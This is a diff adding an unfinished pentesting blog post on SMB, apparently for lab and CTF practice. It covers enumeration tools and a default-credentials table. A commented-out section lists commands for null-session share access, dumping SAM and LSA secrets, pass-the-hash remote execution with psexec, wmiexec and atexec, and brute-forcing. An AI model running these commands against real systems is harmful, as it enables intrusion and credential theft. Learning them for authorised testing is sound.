@@ -1,0 +1,369 @@
+---
+title: SMB Protocol
+---
+
+Have you found that the SMB service is running and you don't know what to do with it?
+
+I am going to show you what this service is and how you can exploit it
+
+![Alt text](/images/smbprotocol.png?raw=true "SMB-Protocol")
+
+<!-- more -->
+
+# Introduction
+
+First of all, the **Server Message Block** (SMB) is a client-server protocol that regulates access to entire files and directories and other network resources such as:
+- Printers
+- Routers
+- Interfaces released to the network
+
+The application area is mainly active on *Windows* operating systems, these network services support SMB with older versions, this means that older windows operating systems are perfectly compatible with newer ones.
+However, there is a solution that allows the use of SMB on ***Linux and Unix*** distributions via Samba.
+
+The SMB server can provide some parts (if it allows it) of your local files, such as shares.
+Therefore the part visible to a client is on the one hand independent of the server structure.
+Access rights are defined by access control lists ***(ACL)***. They can be controlled by attributes such as: 
+- Execute
+- Read
+- Full access for individual users or groups of users
+
+***ACLs*** are defined on the basis of shared resources and therefore do not correspond to the rights assigned locally on the server.
+
+# First steps: Enumeration
+
+Scan a network searching for hosts:
+
+``` console
+$ nbtscan -r 192.168.0.1/24
+```
+
+# View the SMB server version
+First, to look for possible exploits in SMB it is important to know which version is being used. To do this you can use the MSF auxiliary module: 
+
+``` console
+$ msfconsole
+
+$ msf6> use auxiliary/scanner/smb/smb_version
+```
+
+Or u can use **this script**:
+
+``` bash
+ #!/bin/sh
+ #Author: rewardone
+ #Description:
+ #Requires root or sufficient permissions to use tcpdump.
+ # It will listen for the first 7 packets of a null login
+ # and will take the SMB version
+ #Notes:
+ # Sometimes it will not capture or print multiple # lines.
+ # lines. It may be necessary to run a second time to succeed.
+if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
+if [ ! -z $2 ]; then rport=$2; else rport=139; fi
+tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '{\n' & echo -n "$rhost: " &
+echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
+echo "" && sleep .1
+```
+
+
+# SearchSploit
+
+To search for possible exploits that are related to SMB protocol you can use this command in msfconsole:
+
+``` console
+$ msfconsole
+
+    Trace program: running
+
+           wake up, Neo...
+        the matrix has you
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             https://metasploit.com
+
+
+$ msf6> search type:exploit platform:windows target:2008 smb
+searchsploit microsoft smb
+```
+
+Or you can use this command, note that you must have installed searchsploit
+
+``` console
+$ searchsploit smb
+```
+More info: [searchsploit](https://www.exploit-db.com/searchsploit)
+
+# Possible Credentials
+
+Sometimes companies leave the smb protocol misconfigured, or don't even configure it at all, and sometimes if they do, they leave very basic credentials, which you can try to use, such as: 
+
+| Usernames            | Passwords                               |
+|----------------------|-----------------------------------------|
+| (blank)              | (blank)                                 |
+| guest                | (blank)                                 |
+| Administrator, admin | (blank), password, administrator, admin |
+| arcserve             | arcserve, backup                        |
+| tivoli, tmersrvd     | tivoli, tmersrvd, admin                 |
+| backupexec, backup   | backupexec, backup, arcada              |
+| test, lab, demo      | password, test, lab, demo               |
+
+
+# Some Commands to get more information
+
+``` console
+ #Dump interesting information
+$ enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
+$ enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
+$ nmap --script "safe or smb-enum-*" -p 445 <IP>
+
+ #Connect to the rpc
+$ rpcclient -U "" -N <IP> #No creds
+$ rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
+$ #You can use querydispinfo and enumdomusers to query user information
+
+ #Dump user information
+$ /usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
+$ /usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
+
+ #Map possible RPC endpoints
+$ /usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
+$ /usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
+$ /usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
+```
+
+# Enumerating LSARPC and SAMR rpcclient
+
+Pat of this section was extracted from book "Network Security Assesment 3rd Edition"
+You can use the Samba rpcclient utility to interact with RPC endpoints via named pipes. The following lists commands that you can issue to SAMR, LSARPC, and LSARPC-DS interfaces upon establishing a SMB session (often requiring credentials).
+### Server Info
+- Server Info: **srvinfo**
+### Users enumeration
+- List users: **querydispinfo** and **enumdomusers**
+- Get user details: **queryuser <0xrid>**
+- Get user groups: **queryusergroups <0xrid>**
+- GET SID of a user: **lookupnames <username>**
+- Get users aliases: **queryuseraliases [builtin|domain] <sid>**
+
+``` python
+ #Brute-Force users RIDs
+for i in $(seq 500 1100); do
+    rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";
+done
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!---
+# You can also use samrdump.py for this purpose
+Groups enumeration
+List groups: enumdomgroups
+Get group details: querygroup <0xrid>
+Get group members: querygroupmem <0xrid>
+Aliasgroups enumeration
+List alias: enumalsgroups <builtin|domain>
+Get members: queryaliasmem builtin|domain <0xrid>
+Domains enumeration
+List domains: enumdomains
+Get SID: lsaquery
+Domain info: querydominfo
+Shares enumeration
+Enumerate all available shares: netshareenumall
+Info about a share: netsharegetinfo <share>
+More SIDs
+Find SIDs by name: lookupnames <username>
+Find more SIDs: lsaenumsid
+RID cycling (check more SIDs): lookupsids <sid>
+Extra commands
+
+To understand better how the tools samrdump and rpcdump works you should read Pentesting MSRPC.
+GUI connection from linux
+In the terminal:
+xdg-open smb://cascade.htb/
+In file browser window (nautilus, thunar, etc)
+smb://friendzone.htb/general/
+List shared folders
+It is always recommended to look if you can access to anything, if you don't have credentials try using null credentials/guest user.
+smbclient --no-pass -L //<IP> # Null user
+smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
+smbmap -H <IP> [-P <PORT>] #Null user
+smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
+smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
+crackmapexec smb <IP> -u '' -p '' --shares #Null user
+crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
+crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
+Connect/List a shared folder
+#Connect using smbclient
+smbclient --no-pass //<IP>/<Folder>
+smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
+#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient
+
+#List with smbmap, without folder it list everything
+smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
+smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
+smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
+Manually enumerate windows shares and connect to them
+It may be possible that you are restricted to display any shares of the host machine and when you try to list them it appears as if there aren't any shares to connect to. Thus it might be worth a short to try to manually connect to a share. To enumerate the shares manually you might want to look for responses like NT_STATUS_ACCESS_DENIED and NT_STATUS_BAD_NETWORK_NAME, when using a valid session (e.g. null session or valid credentials). These may indicate whether the share exists and you do not have access to it or the share does not exist at all.
+Common share names for windows targets are
+C$
+D$
+ADMIN$
+IPC$
+PRINT$
+FAX$
+SYSVOL
+NETLOGON
+(Common share names from Network Security Assessment 3rd edition)
+You can try to connect to them by using the following command
+smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
+smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
+or this script (using a null session)
+#/bin/bash
+
+ip='<TARGET-IP-HERE>'
+shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')
+
+for share in ${shares[*]}; do
+    output=$(smbclient -U '%' -N \\\\$ip\\$share -c '') 
+
+    if [[ -z $output ]]; then 
+        echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
+    else
+        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
+    fi
+done
+examples
+smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
+smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
+Mount a shared folder
+mount -t cifs //x.x.x.x/share /mnt/share
+mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
+Download files
+Read previous sections to learn how to connect with credentials/Pass-the-Hash.
+#Search a file and download
+sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
+#Download all
+smbclient //<IP>/<share>
+> mask ""
+> recurse
+> prompt
+> mget *
+#Download everything to current directory
+Commands:
+mask: specifies the mask which is used to filter the files within the directory (e.g. "" for all files)
+recurse: toggles recursion on (default: off)
+prompt: toggles prompting for filenames off (default: on)
+mget: copies all files matching the mask from host to client machine
+(Information from the manpage of smbclient)
+Read Registry
+You may be able to read the registry using some discovered credentials. Impacket reg.py allows you to try:
+sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
+sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
+sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
+Local users
+Enumerate local users with SID brute-forcing:
+With Impacket:
+lookupsid.py -no-pass hostname.local
+With Metasploit:
+use auxiliary/scanner/smb/smb_lookupsid
+set rhosts hostname.local
+run
+Note: rpcclient command lookupsids only translates a SID to a username but doesn't allow enumeration via brute-forcing.
+Post Exploitation
+The default config of a Samba server is usually located in /etc/samba/smb.conf and might have some dangerous configs:
+
+The command smbstatus gives information about the server and about who is connected.
+Authenticate using Kerberos
+You can authenticate to kerberos using the tools smbclient and rpcclient:
+smbclient --kerberos //ws01win10.domain.com/C$
+rpcclient -k ws01win10.domain.com
+Execute
+crackmapexec
+crackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. You can indicate which option you prefer to use with the parameter --exec-method:
+apt-get install crackmapexec
+
+crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
+crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
+crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
+# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}
+
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute
+psexec/smbexec
+
+Both options will create a new service (using \pipe\svcctl via SMB) in the victim machine and use it to execute something (psexec will upload an executable file to ADMIN$ share and smbexec will point to cmd.exe/powershell.exe and put in the arguments the payload --file-less technique--).
+More info about psexec and smbexec.
+In kali it is located on /usr/share/doc/python3-impacket/examples/
+#If no password is provided, it will be prompted
+./psexec.py [[domain/]username[:password]@]<targetName or address>
+./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
+psexec \\192.168.122.66 -u Administrator -p 123456Ww
+psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
+Using parameter-k you can authenticate against kerberos instead of NTLM
+wmiexec/dcomexec
+Stealthily execute a command shell without touching the disk or running a new service using DCOM via port 135.
+In kali it is located on /usr/share/doc/python3-impacket/examples/
+#If no password is provided, it will be prompted
+./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
+./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
+#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
+Using parameter-k you can authenticate against kerberos instead of NTLM
+#If no password is provided, it will be prompted
+./dcomexec.py [[domain/]username[:password]@]<targetName or address>
+./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
+#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
+AtExec
+Execute commands via the Task Scheduler (using \pipe\atsvc via SMB).
+In kali it is located on /usr/share/doc/python3-impacket/examples/
+./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
+./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
+Impacket reference
+https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/
+Bruteforce users credentials
+This is not recommended, you could block an account if you exceed the maximum allowed tries
+nmap --script smb-brute -p 445 <IP>
+ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
+SMB relay attack
+This attack uses the Responder toolkit to capture SMB authentication sessions on an internal network, and relays them to a target machine. If the authentication session is successful, it will automatically drop you into a system shell.
+More information about this attack here.
+-->
+
+
+# Blog incomplete, working on it :)
